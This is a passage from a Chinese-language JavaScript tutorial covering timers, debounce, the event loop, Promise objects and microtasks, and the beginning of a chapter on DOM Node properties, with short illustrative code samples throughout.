    ``setTimeout`` 和 ``setInterval`` 函数，都返回一个整数值，表示计数器编号。将该整数传入 ``clearTimeout`` 和 ``clearInterval`` 函数，就可以取消对应的定时器。

   .. code:: javascript

      var id1 = setTimeout(f, 1000);
      var id2 = setInterval(f, 1000);
   
      clearTimeout(id1);
      clearInterval(id2);

   上面代码中，回调函数 ``f`` 不会再执行了，因为两个定时器都被取消了。

    ``setTimeout`` 和 ``setInterval`` 返回的整数值是连续的，也就是说，第二个 ``setTimeout`` 方法返回的整数值，将比第一个的整数值大1。

   .. code:: javascript

      function f() {}
      setTimeout(f, 1000) // 10
      setTimeout(f, 1000) // 11
      setTimeout(f, 1000) // 12

   上面代码中，连续调用三次 ``setTimeout`` ，返回值都比上一次大了1。

   利用这一点，可以写一个函数，取消当前所有的 ``setTimeout`` 定时器。

   .. code:: javascript

      (function() {
        // 每轮事件循环检查一次
        var gid = setInterval(clearAllTimeouts, 0);
   
        function clearAllTimeouts() {
          var id = setTimeout(function() {}, 0);
          while (id > 0) {
            if (id !== gid) {
              clearTimeout(id);
            }
            id--;
          }
        }
      })();

   上面代码中，先调用 ``setTimeout`` ，得到一个计算器编号，然后把编号比它小的计数器全部取消。

实例：debounce 函数
-----------------

   有时，我们不希望回调函数被频繁调用。比如，用户填入网页输入框的内容，希望通过 Ajax 方法传回服务器，jQuery 的写法如下。

   .. code:: javascript

      $('textarea').on('keydown', ajaxAction);

   这样写有一个很大的缺点，就是如果用户连续击键，就会连续触发 ``keydown`` 事件，造成大量的 Ajax 通信。这是不必要的，而且很可能产生性能问题。正确的做法应该是，设置一个门槛值，表示两次 Ajax 通信的最小间隔时间。如果在间隔时间内，发生新的 ``keydown`` 事件，则不触发 Ajax 通信，并且重新开始计时。如果过了指定时间，没有发生新的 ``keydown`` 事件，再将数据发送出去。

   这种做法叫做 debounce（防抖动）。假定两次 Ajax 通信的间隔不得小于2500毫秒，上面的代码可以改写成下面这样。

   .. code:: javascript

      $('textarea').on('keydown', debounce(ajaxAction, 2500));
   
      function debounce(fn, delay){
        var timer = null; // 声明计时器
        return function() {
          var context = this;
          var args = arguments;
          clearTimeout(timer);
          timer = setTimeout(function () {
            fn.apply(context, args);
          }, delay);
        };
      }

   上面代码中，只要在2500毫秒之内，用户再次击键，就会取消上一次的定时器，然后再新建一个定时器。这样就保证了回调函数之间的调用间隔，至少是2500毫秒。

运行机制
-------

    ``setTimeout`` 和 ``setInterval`` 的运行机制，是将指定的代码移出本轮事件循环，等到下一轮事件循环，再检查是否到了指定时间。如果到了，就执行对应的代码；如果不到，就继续等待。

   这意味着， ``setTimeout`` 和 ``setInterval`` 指定的回调函数，必须等到本轮事件循环的所有同步任务都执行完，才会开始执行。由于前面的任务到底需要多少时间执行完，是不确定的，所以没有办法保证， ``setTimeout`` 和 ``setInterval`` 指定的任务，一定会按照预定时间执行。

   .. code:: javascript

      setTimeout(someTask, 100);
      veryLongTask();

   上面代码的 ``setTimeout`` ，指定100毫秒以后运行一个任务。但是，如果后面的 ``veryLongTask`` 函数（同步任务）运行时间非常长，过了100毫秒还无法结束，那么被推迟运行的 ``someTask`` 就只有等着，等到 ``veryLongTask`` 运行结束，才轮到它执行。

   再看一个 ``setInterval`` 的例子。

   .. code:: javascript

      setInterval(function () {
        console.log(2);
      }, 1000);
   
      sleep(3000);
   
      function sleep(ms) {
        var start = Date.now();
        while ((Date.now() - start) < ms) {
        }
      }

   上面代码中， ``setInterval`` 要求每隔1000毫秒，就输出一个2。但是，紧接着的 ``sleep`` 语句需要3000毫秒才能完成，那么 ``setInterval`` 就必须推迟到3000毫秒之后才开始生效。注意，生效后 ``setInterval`` 不会产生累积效应，即不会一下子输出三个2，而是只会输出一个2。

setTimeout(f, 0)
-----------------


含义
~~~

    ``setTimeout`` 的作用是将代码推迟到指定时间执行，如果指定时间为 ``0`` ，即 ``setTimeout(f, 0)`` ，那么会立刻执行吗？

   答案是不会。因为上一节说过，必须要等到当前脚本的同步任务，全部处理完以后，才会执行 ``setTimeout`` 指定的回调函数 ``f`` 。也就是说， ``setTimeout(f, 0)`` 会在下一轮事件循环一开始就执行。

   .. code:: javascript

      setTimeout(function () {
        console.log(1);
      }, 0);
      console.log(2);
      // 2
      // 1

   上面代码先输出 ``2`` ，再输出 ``1`` 。因为 ``2`` 是同步任务，在本轮事件循环执行，而 ``1`` 是下一轮事件循环执行。

   总之， ``setTimeout(f, 0)`` 这种写法的目的是，尽可能早地执行 ``f`` ，但是并不能保证立刻就执行 ``f`` 。

   实际上， ``setTimeout(f, 0)`` 不会真的在0毫秒之后运行，不同的浏览器有不同的实现。以 Edge 浏览器为例，会等到4毫秒之后运行。如果电脑正在使用电池供电，会等到16毫秒之后运行；如果网页不在当前 Tab 页，会推迟到1000毫秒（1秒）之后运行。这样是为了节省系统资源。

应用
~~~

    ``setTimeout(f, 0)`` 有几个非常重要的用途。它的一大应用是，可以调整事件的发生顺序。比如，网页开发中，某个事件先发生在子元素，然后冒泡到父元素，即子元素的事件回调函数，会早于父元素的事件回调函数触发。如果，想让父元素的事件回调函数先发生，就要用到 ``setTimeout(f, 0)`` 。

   .. code:: javascript

      // HTML 代码如下
      // <input type="button" id="myButton" value="click">
   
      var input = document.getElementById('myButton');
   
      input.onclick = function A() {
        setTimeout(function B() {
          input.value +=' input';
        }, 0)
      };
   
      document.body.onclick = function C() {
        input.value += ' body'
      };

   上面代码在点击按钮后，先触发回调函数 ``A`` ，然后触发函数 ``C`` 。函数 ``A`` 中， ``setTimeout`` 将函数 ``B`` 推迟到下一轮事件循环执行，这样就起到了，先触发父元素的回调函数 ``C`` 的目的了。

   另一个应用是，用户自定义的回调函数，通常在浏览器的默认动作之前触发。比如，用户在输入框输入文本， ``keypress`` 事件会在浏览器接收文本之前触发。因此，下面的回调函数是达不到目的的。

   .. code:: javascript

      // HTML 代码如下
      // <input type="text" id="input-box">
   
      document.getElementById('input-box').onkeypress = function (event) {
        this.value = this.value.toUpperCase();
      }

   上面代码想在用户每次输入文本后，立即将字符转为大写。但是实际上，它只能将本次输入前的字符转为大写，因为浏览器此时还没接收到新的文本，所以 ``this.value`` 取不到最新输入的那个字符。只有用 ``setTimeout`` 改写，上面的代码才能发挥作用。

   .. code:: javascript

      document.getElementById('input-box').onkeypress = function() {
        var self = this;
        setTimeout(function() {
          self.value = self.value.toUpperCase();
        }, 0);
      }

   上面代码将代码放入 ``setTimeout`` 之中，就能使得它在浏览器接收到文本之后触发。

   由于 ``setTimeout(f, 0)`` 实际上意味着，将任务放到浏览器最早可得的空闲时段执行，所以那些计算量大、耗时长的任务，常常会被放到几个小部分，分别放到 ``setTimeout(f, 0)`` 里面执行。

   .. code:: javascript

      var div = document.getElementsByTagName('div')[0];
   
      // 写法一
      for (var i = 0xA00000; i < 0xFFFFFF; i++) {
        div.style.backgroundColor = '#' + i.toString(16);
      }
   
      // 写法二
      var timer;
      var i=0x100000;
   
      function func() {
        timer = setTimeout(func, 0);
        div.style.backgroundColor = '#' + i.toString(16);
        if (i++ == 0xFFFFFF) clearTimeout(timer);
      }
   
      timer = setTimeout(func, 0);

   上面代码有两种写法，都是改变一个网页元素的背景色。写法一会造成浏览器“堵塞”，因为 JavaScript 执行速度远高于 DOM，会造成大量 DOM 操作“堆积”，而写法二就不会，这就是 ``setTimeout(f, 0)`` 的好处。

   另一个使用这种技巧的例子是代码高亮的处理。如果代码块很大，一次性处理，可能会对性能造成很大的压力，那么将其分成一个个小块，一次处理一块，比如写成 ``setTimeout(highlightNext, 50)`` 的样子，性能压力就会减轻。

/🟠 Promise 对象
================

概述
---

   Promise 对象是 JavaScript 的异步操作解决方案，为异步操作提供统一接口。它起到代理作用（proxy），充当异步操作与回调函数之间的中介，使得异步操作具备同步操作的接口。Promise 可以让异步操作写起来，就像在写同步操作的流程，而不必一层层地嵌套回调函数。

   注意，本章只是 Promise 对象的简单介绍。为了避免与后续教程的重复，更完整的介绍请看[《ES6 标准入门》](http://es6.ruanyifeng.com/)的[《Promise 对象》](http://es6.ruanyifeng.com/#docs/promise)一章。

   首先，Promise 是一个对象，也是一个构造函数。

   .. code:: javascript

      function f1(resolve, reject) {
        // 异步代码...
      }
   
      var p1 = new Promise(f1);

   上面代码中， ``Promise`` 构造函数接受一个回调函数 ``f1`` 作为参数， ``f1`` 里面是异步操作的代码。然后，返回的 ``p1`` 就是一个 Promise 实例。

   Promise 的设计思想是，所有异步任务都返回一个 Promise 实例。Promise 实例有一个 ``then`` 方法，用来指定下一步的回调函数。

   .. code:: javascript

      var p1 = new Promise(f1);
      p1.then(f2);

   上面代码中， ``f1`` 的异步操作执行完成，就会执行 ``f2`` 。

   传统的写法可能需要把 ``f2`` 作为回调函数传入 ``f1`` ，比如写成 ``f1(f2)`` ，异步操作完成后，在 ``f1`` 内部调用 ``f2`` 。Promise 使得 ``f1`` 和 ``f2`` 变成了链式写法。不仅改善了可读性，而且对于多层嵌套的回调函数尤其方便。

   .. code:: javascript

      // 传统写法
      step1(function (value1) {
        step2(value1, function(value2) {
          step3(value2, function(value3) {
            step4(value3, function(value4) {
              // ...
            });
          });
        });
      });
   
      // Promise 的写法
      (new Promise(step1))
        .then(step2)
        .then(step3)
        .then(step4);

   从上面代码可以看到，采用 Promises 以后，程序流程变得非常清楚，十分易读。注意，为了便于理解，上面代码的 ``Promise`` 实例的生成格式，做了简化，真正的语法请参照下文。

   总的来说，传统的回调函数写法使得代码混成一团，变得横向发展而不是向下发展。Promise 就是解决这个问题，使得异步流程可以写成同步流程。

   Promise 原本只是社区提出的一个构想，一些函数库率先实现了这个功能。ECMAScript 6 将其写入语言标准，目前 JavaScript 原生支持 Promise 对象。

Promise 对象的状态
----------------

   Promise 对象通过自身的状态，来控制异步操作。Promise 实例具有三种状态。

   - 异步操作未完成（pending）
   - 异步操作成功（fulfilled）
   - 异步操作失败（rejected）

   上面三种状态里面， ``fulfilled`` 和 ``rejected`` 合在一起称为 ``resolved`` （已定型）。

   这三种的状态的变化途径只有两种。

   - 从“未完成”到“成功”
   - 从“未完成”到“失败”

   一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺成效，就不得再改变了。这也意味着，Promise 实例的状态变化只可能发生一次。

   因此，Promise 的最终结果只有两种。

   - 异步操作成功，Promise 实例传回一个值（value），状态变为 ``fulfilled`` 。
   - 异步操作失败，Promise 实例抛出一个错误（error），状态变为 ``rejected`` 。

Promise 构造函数
---------------

   JavaScript 提供原生的 ``Promise`` 构造函数，用来生成 Promise 实例。

   .. code:: javascript

      var promise = new Promise(function (resolve, reject) {
        // ...
   
        if (/* 异步操作成功 */){
          resolve(value);
        } else { /* 异步操作失败 */
          reject(new Error());
        }
      });

   上面代码中， ``Promise`` 构造函数接受一个函数作为参数，该函数的两个参数分别是 ``resolve`` 和 ``reject`` 。它们是两个函数，由 JavaScript 引擎提供，不用自己实现。

    ``resolve`` 函数的作用是，将 ``Promise`` 实例的状态从“未完成”变为“成功”（即从 ``pending`` 变为 ``fulfilled`` ），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去。 ``reject`` 函数的作用是，将 ``Promise`` 实例的状态从“未完成”变为“失败”（即从 ``pending`` 变为 ``rejected`` ），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。

   下面是一个例子。

   .. code:: javascript

      function timeout(ms) {
        return new Promise((resolve, reject) => {
          setTimeout(resolve, ms, 'done');
        });
      }
   
      timeout(100)

   上面代码中， ``timeout(100)`` 返回一个 Promise 实例。100毫秒以后，该实例的状态会变为 ``fulfilled`` 。

Promise.prototype.then()
-------------------------

   Promise 实例的 ``then`` 方法，用来添加回调函数。

    ``then`` 方法可以接受两个回调函数，第一个是异步操作成功时（变为 ``fulfilled`` 状态）的回调函数，第二个是异步操作失败（变为 ``rejected`` ）时的回调函数（该参数可以省略）。一旦状态改变，就调用相应的回调函数。

   .. code:: javascript

      var p1 = new Promise(function (resolve, reject) {
        resolve('成功');
      });
      p1.then(console.log, console.error);
      // "成功"
   
      var p2 = new Promise(function (resolve, reject) {
        reject(new Error('失败'));
      });
      p2.then(console.log, console.error);
      // Error: 失败

   上面代码中， ``p1`` 和 ``p2`` 都是Promise 实例，它们的 ``then`` 方法绑定两个回调函数：成功时的回调函数 ``console.log`` ，失败时的回调函数 ``console.error`` （可以省略）。 ``p1`` 的状态变为成功， ``p2`` 的状态变为失败，对应的回调函数会收到异步操作传回的值，然后在控制台输出。

    ``then`` 方法可以链式使用。

   .. code:: javascript

      p1
        .then(step1)
        .then(step2)
        .then(step3)
        .then(
          console.log,
          console.error
        );

   上面代码中， ``p1`` 后面有四个 ``then`` ，意味依次有四个回调函数。只要前一步的状态变为 ``fulfilled`` ，就会依次执行紧跟在后面的回调函数。

   最后一个 ``then`` 方法，回调函数是 ``console.log`` 和 ``console.error`` ，用法上有一点重要的区别。 ``console.log`` 只显示 ``step3`` 的返回值，而 ``console.error`` 可以显示 ``p1`` 、 ``step1`` 、 ``step2`` 、 ``step3`` 之中任意一个发生的错误。举例来说，如果 ``step1`` 的状态变为 ``rejected`` ，那么 ``step2`` 和 ``step3`` 都不会执行了（因为它们是 ``resolved`` 的回调函数）。Promise 开始寻找，接下来第一个为 ``rejected`` 的回调函数，在上面代码中是 ``console.error`` 。这就是说，Promise 对象的报错具有传递性。

then() 用法辨析
--------------

   Promise 的用法，简单说就是一句话：使用 ``then`` 方法添加回调函数。但是，不同的写法有一些细微的差别，请看下面四种写法，它们的差别在哪里？

   .. code:: javascript

      // 写法一
      f1().then(function () {
        return f2();
      });
   
      // 写法二
      f1().then(function () {
        f2();
      });
   
      // 写法三
      f1().then(f2());
   
      // 写法四
      f1().then(f2);

   为了便于讲解，下面这四种写法都再用 ``then`` 方法接一个回调函数 ``f3`` 。写法一的 ``f3`` 回调函数的参数，是 ``f2`` 函数的运行结果。

   .. code:: javascript

      f1().then(function () {
        return f2();
      }).then(f3);

   写法二的 ``f3`` 回调函数的参数是 ``undefined`` 。

   .. code:: javascript

      f1().then(function () {
        f2();
        return;
      }).then(f3);

   写法三的 ``f3`` 回调函数的参数，是 ``f2`` 函数返回的函数的运行结果。

   .. code:: javascript

      f1().then(f2())
        .then(f3);

   写法四与写法一只有一个差别，那就是 ``f2`` 会接收到 ``f1()`` 返回的结果。

   .. code:: javascript

      f1().then(f2)
        .then(f3);

实例：图片加载
------------

   下面是使用 Promise 完成图片的加载。

   .. code:: javascript

      var preloadImage = function (path) {
        return new Promise(function (resolve, reject) {
          var image = new Image();
          image.onload  = resolve;
          image.onerror = reject;
          image.src = path;
        });
      };

   上面代码中， ``image`` 是一个图片对象的实例。它有两个事件监听属性， ``onload`` 属性在图片加载成功后调用， ``onerror`` 属性在加载失败调用。

   上面的 ``preloadImage()`` 函数用法如下。

   .. code:: javascript

      preloadImage('https://example.com/my.jpg')
        .then(function (e) { document.body.append(e.target) })
        .then(function () { console.log('加载成功') })

   上面代码中，图片加载成功以后， ``onload`` 属性会返回一个事件对象，因此第一个 ``then()`` 方法的回调函数，会接收到这个事件对象。该对象的 ``target`` 属性就是图片加载后生成的 DOM 节点。

小结
---

   Promise 的优点在于，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。它有一整套接口，可以实现许多强大的功能，比如同时执行多个异步操作，等到它们的状态都改变以后，再执行一个回调函数；再比如，为多个回调函数中抛出的错误，统一指定处理方法等等。

   而且，Promise 还有一个传统写法没有的好处：它的状态一旦改变，无论何时查询，都能得到这个状态。这意味着，无论何时为 Promise 实例添加回调函数，该函数都能正确执行。所以，你不用担心是否错过了某个事件或信号。如果是传统写法，通过监听事件来执行回调函数，一旦错过了事件，再添加回调函数是不会执行的。

   Promise 的缺点是，编写的难度比传统写法高，而且阅读代码也不是一眼可以看懂。你只会看到一堆 ``then`` ，必须自己在 ``then`` 的回调函数里面理清逻辑。

微任务
-----

   Promise 的回调函数属于异步任务，会在同步任务之后执行。

   .. code:: javascript

      new Promise(function (resolve, reject) {
        resolve(1);
      }).then(console.log);
   
      console.log(2);
      // 2
      // 1

   上面代码会先输出2，再输出1。因为 ``console.log(2)`` 是同步任务，而 ``then`` 的回调函数属于异步任务，一定晚于同步任务执行。

   但是，Promise 的回调函数不是正常的异步任务，而是微任务（microtask）。它们的区别在于，正常任务追加到下一轮事件循环，微任务追加到本轮事件循环。这意味着，微任务的执行时间一定早于正常任务。

   .. code:: javascript

      setTimeout(function() {
        console.log(1);
      }, 0);
   
      new Promise(function (resolve, reject) {
        resolve(2);
      }).then(console.log);
   
      console.log(3);
      // 3
      // 2
      // 1

   上面代码的输出结果是 ``321`` 。这说明 ``then`` 的回调函数的执行时间，早于 ``setTimeout(fn, 0)`` 。因为 ``then`` 是本轮事件循环执行， ``setTimeout(fn, 0)`` 在下一轮事件循环开始时执行。

参考链接
-------

   - Sebastian Porto, [Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises](https://sporto.github.io/blog/2012/12/09/callbacks-listeners-promises/)
   - Rhys Brett-Bowen, [Promises/A+ - understanding the spec through implementation](http://modernjavascript.blogspot.com/2013/08/promisesa-understanding-by-doing.html)
   - Matt Podwysocki, Amanda Silver, [Asynchronous Programming in JavaScript with “Promises”](http://blogs.msdn.com/b/ie/archive/2011/09/11/asynchronous-programming-in-javascript-with-promises.aspx)
   - Marc Harter, [Promise A+ Implementation](https://gist.github.com//wavded/5692344)
   - Bryan Klimt, [What’s so great about JavaScript Promises?](http://blog.parse.com/2013/01/29/whats-so-great-about-javascript-promises/)
   - Jake Archibald, [JavaScript Promises There and back again](http://www.html5rocks.com/en/tutorials/es6/promises/)
   - Mikito Takada, [7. Control flow, Mixu's Node book](http://book.mixu.net/node/ch7.html)


/🟡8. DOM
================================================================================

/🟠 DOM 概述
============


DOM
----

   DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。

   浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。

   DOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。后面介绍的就是 JavaScript 对 DOM 标准的实现和用法。

节点
---

   DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。

   节点的类型有七种。

   -  ``Document`` ：整个文档树的顶层节点
   -  ``DocumentType`` ： ``doctype`` 标签（比如 ``<!DOCTYPE html>`` ）
   -  ``Element`` ：网页的各种HTML标签（比如 ``<body>`` 、 ``<a>`` 等）
   -  ``Attr`` ：网页元素的属性（比如 ``class="right"`` ）
   -  ``Text`` ：标签之间或标签包含的文本
   -  ``Comment`` ：注释
   -  ``DocumentFragment`` ：文档的片段

   浏览器提供一个原生的节点对象 ``Node`` ，上面这七种节点都继承了 ``Node`` ，因此具有一些共同的属性和方法。

节点树
-----

   一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树。它有一个顶层节点，下一层都是顶层节点的子节点，然后子节点又有自己的子节点，就这样层层衍生出一个金字塔结构，又像一棵树。

   浏览器原生提供 ``document`` 节点，代表整个文档。

   .. code:: javascript

      document
      // 整个文档树

   文档的第一层有两个节点，第一个是文档类型节点（ ``<!doctype html>`` ），第二个是 HTML 网页的顶层容器标签 ``<html>`` 。后者构成了树结构的根节点（root node），其他 HTML 标签节点都是它的下级节点。

   除了根节点，其他节点都有三种层级关系。

   - 父节点关系（parentNode）：直接的那个上级节点
   - 子节点关系（childNodes）：直接的下级节点
   - 同级节点关系（sibling）：拥有同一个父节点的节点

   DOM 提供操作接口，用来获取这三种关系的节点。比如，子节点接口包括 ``firstChild`` （第一个子节点）和 ``lastChild`` （最后一个子节点）等属性，同级节点接口包括 ``nextSibling`` （紧邻在后的那个同级节点）和 ``previousSibling`` （紧邻在前的那个同级节点）属性。

/🟠 Node 接口
=============

   所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。这是 DOM 操作的基础。

属性
---


Node.prototype.nodeType
~~~~~~~~~~~~~~~~~~~~~~~~

    ``nodeType`` 属性返回一个整数值，表示节点的类型。

   .. code:: javascript

      document.nodeType // 9

   上面代码中，文档节点的类型值为9。

   Node 对象定义了几个常量，对应这些类型值。

   .. code:: javascript

      document.nodeType === Node.DOCUMENT_NODE // true

   上面代码中，文档节点的 ``nodeType`` 属性等于常量 ``Node.DOCUMENT_NODE`` 。

   不同节点的 ``nodeType`` 属性值和对应的常量如下。

   - 文档节点（document）：9，对应常量 ``Node.DOCUMENT_NODE`` 
   - 元素节点（element）：1，对应常量 ``Node.ELEMENT_NODE`` 
   - 属性节点（attr）：2，对应常量 ``Node.ATTRIBUTE_NODE`` 
   - 文本节点（text）：3，对应常量 ``Node.TEXT_NODE`` 
   - 文档片断节点（DocumentFragment）：11，对应常量 ``Node.DOCUMENT_FRAGMENT_NODE`` 
   - 文档类型节点（DocumentType）：10，对应常量 ``Node.DOCUMENT_TYPE_NODE`` 
   - 注释节点（Comment）：8，对应常量 ``Node.COMMENT_NODE`` 

   确定节点类型时，使用 ``nodeType`` 属性是常用方法。

   .. code:: javascript

      var node = document.documentElement.firstChild;
      if (node.nodeType === Node.ELEMENT_NODE) {
        console.log('该节点是元素节点');
      }

Node.prototype.nodeName
~~~~~~~~~~~~~~~~~~~~~~~~

    ``nodeName`` 属性返回节点的名称。

   .. code:: javascript

      // HTML 代码如下
      // <div id="d1">hello world</div>
      var div = document.getElementById('d1');
      div.nodeName // "DIV"

   上面代码中，元素节点 ``<div>`` 的 ``nodeName`` 属性就是大写的标签名 ``DIV`` 。

   不同节点的 ``nodeName`` 属性值如下。

   - 文档节点（document）： ``#document`` 
   - 元素节点（element）：大写的标签名
   - 属性节点（attr）：属性的名称
   - 文本节点（text）： ``#text`` 
   - 文档片断节点（DocumentFragment）： ``#document-fragment`` 
   - 文档类型节点（DocumentType）：文档的类型
   - 注释节点（Comment）： ``#comment`` 

Node.prototype.nodeValue
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``nodeValue`` 属性返回一个字符串，表示当前节点本身的文本值，该属性可读写。

   只有文本节点（text）、注释节点（comment）和属性节点（attr）有文本值，因此这三类节点的 ``nodeValue`` 可以返回结果，其他类型的节点一律返回 ``null`` 。同样的，也只有这三类节点可以设置 ``nodeValue`` 属性的值，其他类型的节点设置无效。

   .. code:: javascript

      // HTML 代码如下
      // <div id="d1">hello world</div>
      var div = document.getElementById('d1');
      div.nodeValue // null
      div.firstChild.nodeValue // "hello world"

   上面代码中， ``div`` 是元素节点， ``nodeValue`` 属性返回 ``null`` 。 ``div.firstChild`` 是文本节点，所以可以返回文本值。

Node.prototype.textContent
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``textContent`` 属性返回当前节点和它的所有后代节点的文本内容。

   .. code:: javascript

      // HTML 代码为
      // <div id="divA">This is <span>some</span> text</div>
   
      document.getElementById('divA').textContent
      // This is some text

    ``textContent`` 属性自动忽略当前节点内部的 HTML 标签，返回所有文本内容。

   该属性是可读写的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。它还有一个好处，就是自动对 HTML 标签转义。这很适合用于用户提供的内容。

   .. code:: javascript

      document.getElementById('foo').textContent = '<p>GoodBye!</p>';

   上面代码在插入文本时，会将 ``<p>`` 标签解释为文本，而不会当作标签处理。

   对于文本节点（text）、注释节点（comment）和属性节点（attr）， ``textContent`` 属性的值与 ``nodeValue`` 属性相同。对于其他类型的节点，该属性会将每个子节点（不包括注释节点）的内容连接在一起返回。如果一个节点没有子节点，则返回空字符串。

   文档节点（document）和文档类型节点（doctype）的 ``textContent`` 属性为 ``null`` 。如果要读取整个文档的内容，可以使用 ``document.documentElement.textContent`` 。

Node.prototype.baseURI
~~~~~~~~~~~~~~~~~~~~~~~

    ``baseURI`` 属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。

   .. code:: javascript

      // 当前网页的网址为
      // http://www.example.com/index.html
      document.baseURI
      // "http://www.example.com/index.html"

   如果无法读到网页的 URL， ``baseURI`` 属性返回 ``null`` 。

   该属性的值一般由当前网址的 URL（即 ``window.location`` 属性）决定，但是可以使用 HTML 的 ``<base>`` 标签，改变该属性的值。

   .. code:: html

      <base href="http://www.example.com/page.html">

   设置了以后， ``baseURI`` 属性就返回 ``<base>`` 标签设置的值。

Node.prototype.ownerDocument
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Node.ownerDocument`` 属性返回当前节点所在的顶层文档对象，即 ``document`` 对象。

   .. code:: javascript

      var d = p.ownerDocument;
      d === document // true

    ``document`` 对象本身的 ``ownerDocument`` 属性，返回 ``null`` 。

Node.prototype.nextSibling
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Node.nextSibling`` 属性返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <div id="d1">hello</div><div id="d2">world</div>
      var d1 = document.getElementById('d1');
      var d2 = document.getElementById('d2');
   
      d1.nextSibling === d2 // true

   上面代码中， ``d1.nextSibling`` 就是紧跟在 ``d1`` 后面的同级节点 ``d2`` 。

   注意，该属性还包括文本节点和注释节点（ ``<!-- comment -->`` ）。因此如果当前节点后面有空格，该属性会返回一个文本节点，内容为空格。

    ``nextSibling`` 属性可以用来遍历所有子节点。

   .. code:: javascript

      var el = document.getElementById('div1').firstChild;
   
      while (el !== null) {
        console.log(el.nodeName);
        el = el.nextSibling;
      }

   上面代码遍历 ``div1`` 节点的所有子节点。

Node.prototype.previousSibling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``previousSibling`` 属性返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <div id="d1">hello</div><div id="d2">world</div>
      var d1 = document.getElementById('d1');
      var d2 = document.getElementById('d2');
   
      d2.previousSibling === d1 // true

   上面代码中， ``d2.previousSibling`` 就是 ``d2`` 前面的同级节点 ``d1`` 。

   注意，该属性还包括文本节点和注释节点。因此如果当前节点前面有空格，该属性会返回一个文本节点，内容为空格。

Node.prototype.parentNode
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``parentNode`` 属性返回当前节点的父节点。对于一个节点来说，它的父节点只可能是三种类型：元素节点（element）、文档节点（document）和文档片段节点（documentfragment）。

   .. code:: javascript

      if (node.parentNode) {
        node.parentNode.removeChild(node);
      }

   上面代码中，通过 ``node.parentNode`` 属性将 ``node`` 节点从文档里面移除。

   文档节点（document）和文档片段节点（documentfragment）的父节点都是 ``null`` 。另外，对于那些生成后还没插入 DOM 树的节点，父节点也是 ``null`` 。

Node.prototype.parentElement
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``parentElement`` 属性返回当前节点的父元素节点。如果当前节点没有父节点，或者父节点类型不是元素节点，则返回 ``null`` 。

   .. code:: javascript

      if (node.parentElement) {
        node.parentElement.style.color = 'red';
      }

   上面代码中，父元素节点的样式设定了红色。

   由于父节点只可能是三种类型：元素节点、文档节点（document）和文档片段节点（documentfragment）。 ``parentElement`` 属性相当于把后两种父节点都排除了。

Node.prototype.firstChild，Node.prototype.lastChild
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``firstChild`` 属性返回当前节点的第一个子节点，如果当前节点没有子节点，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <p id="p1"><span>First span</span></p>
      var p1 = document.getElementById('p1');
      p1.firstChild.nodeName // "SPAN"

   上面代码中， ``p`` 元素的第一个子节点是 ``span`` 元素。

   注意， ``firstChild`` 返回的除了元素节点，还可能是文本节点或注释节点。

   .. code:: javascript

      // HTML 代码如下
      // <p id="p1">
      //   <span>First span</span>
      //  </p>
      var p1 = document.getElementById('p1');
      p1.firstChild.nodeName // "#text"

   上面代码中， ``p`` 元素与 ``span`` 元素之间有空白字符，这导致 ``firstChild`` 返回的是文本节点。

    ``lastChild`` 属性返回当前节点的最后一个子节点，如果当前节点没有子节点，则返回 ``null`` 。用法与 ``firstChild`` 属性相同。

Node.prototype.childNodes
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``childNodes`` 属性返回一个类似数组的对象（ ``NodeList`` 集合），成员包括当前节点的所有子节点。

   .. code:: javascript

      var children = document.querySelector('ul').childNodes;

   上面代码中， ``children`` 就是 ``ul`` 元素的所有子节点。

   使用该属性，可以遍历某个节点的所有子节点。

   .. code:: javascript

      var div = document.getElementById('div1');
      var children = div.childNodes;
   
      for (var i = 0; i < children.length; i++) {
        // ...
      }

   文档节点（document）就有两个子节点：文档类型节点（docType）和 HTML 根元素节点。

   .. code:: javascript

      var children = document.childNodes;
      for (var i = 0; i < children.length; i++) {
        console.log(children[i].nodeType);
      }
      // 10
      // 1

   上面代码中，文档节点的第一个子节点的类型是10（即文档类型节点），第二个子节点的类型是1（即元素节点）。

   注意，除了元素节点， ``childNodes`` 属性的返回值还包括文本节点和注释节点。如果当前节点不包括任何子节点，则返回一个空的 ``NodeList`` 集合。由于 ``NodeList`` 对象是一个动态集合，一旦子节点发生变化，立刻会反映在返回结果之中。

Node.prototype.isConnected
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``isConnected`` 属性返回一个布尔值，表示当前节点是否在文档之中。

   .. code:: javascript

      var test = document.createElement('p');
      test.isConnected // false
   
